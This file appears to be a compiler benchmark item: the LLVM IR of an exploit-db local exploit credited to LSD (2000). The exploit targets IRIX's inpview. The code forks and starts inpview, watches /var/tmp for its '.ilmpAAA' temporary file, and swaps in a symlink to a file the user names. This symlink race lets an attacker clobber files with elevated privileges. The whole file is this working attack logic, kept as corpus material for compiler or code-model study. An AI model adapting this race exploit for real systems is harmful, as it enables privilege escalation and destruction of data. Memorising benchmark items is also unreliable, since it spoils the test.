; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20130.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_20130.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i32 }

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM jan 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [54 x i8] c"/usr/lib/InPerson/inpview for irix 6.5 6.5.8 IP:all\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"usage: %s file\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"/usr/lib/InPerson/inpview\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"looking for temporary file... \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c".ilmpAAA\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"found!\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"/bin/ls\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"ls\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-l\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca %struct.dirent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp ne i32 %10, 2
  br i1 %11, label %12, label %18

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* %15)
  %17 = call i32 @exit(i32 -1) #3
  unreachable

18:                                               ; preds = %2
  %19 = call i32 (...) @fork()
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %28, label %21

21:                                               ; preds = %18
  %22 = call i32 @nice(i32 -20)
  %23 = call i32 @sleep(i32 2)
  %24 = call i32 @close(i32 0)
  %25 = call i32 @close(i32 1)
  %26 = call i32 @close(i32 2)
  %27 = call i32 @execle(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32 0, i32 0)
  br label %28

28:                                               ; preds = %21, %18
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 @fflush(i32 %30)
  %32 = call i32 @chdir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %33 = call i32* @opendir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %33, i32** %6, align 8
  br label %34

34:                                               ; preds = %28, %38, %48
  %35 = load i32*, i32** %6, align 8
  %36 = call %struct.dirent* @readdir(i32* %35)
  store %struct.dirent* %36, %struct.dirent** %7, align 8
  %37 = icmp eq %struct.dirent* %36, null
  br i1 %37, label %38, label %41

38:                                               ; preds = %34
  %39 = load i32*, i32** %6, align 8
  %40 = call i32 @rewinddir(i32* %39)
  br label %34

41:                                               ; preds = %34
  %42 = load %struct.dirent*, %struct.dirent** %7, align 8
  %43 = getelementptr inbounds %struct.dirent, %struct.dirent* %42, i32 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @strncmp(i32 %44, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0), i32 8)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %48, label %47

47:                                               ; preds = %41
  br label %49

48:                                               ; preds = %41
  br label %34

49:                                               ; preds = %47
  %50 = load i32*, i32** %6, align 8
  %51 = call i32 @closedir(i32* %50)
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  br label %53

53:                                               ; preds = %49, %63
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = load %struct.dirent*, %struct.dirent** %7, align 8
  %58 = getelementptr inbounds %struct.dirent, %struct.dirent* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = call i32 @symlink(i8* %56, i32 %59)
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %63, label %62

62:                                               ; preds = %53
  br label %64

63:                                               ; preds = %53
  br label %53

64:                                               ; preds = %62
  %65 = call i32 @sleep(i32 2)
  %66 = load %struct.dirent*, %struct.dirent** %7, align 8
  %67 = getelementptr inbounds %struct.dirent, %struct.dirent* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @unlink(i32 %68)
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 1
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %72, i32 0)
  %74 = load i32, i32* %3, align 4
  ret i32 %74
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @fork(...) #1

declare dso_local i32 @nice(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execle(i8*, i8*, i32, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32* @opendir(i8*) #1

declare dso_local %struct.dirent* @readdir(i32*) #1

declare dso_local i32 @rewinddir(i32*) #1

declare dso_local i32 @strncmp(i32, i8*, i32) #1

declare dso_local i32 @closedir(i32*) #1

declare dso_local i32 @symlink(i8*, i32) #1

declare dso_local i32 @unlink(i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
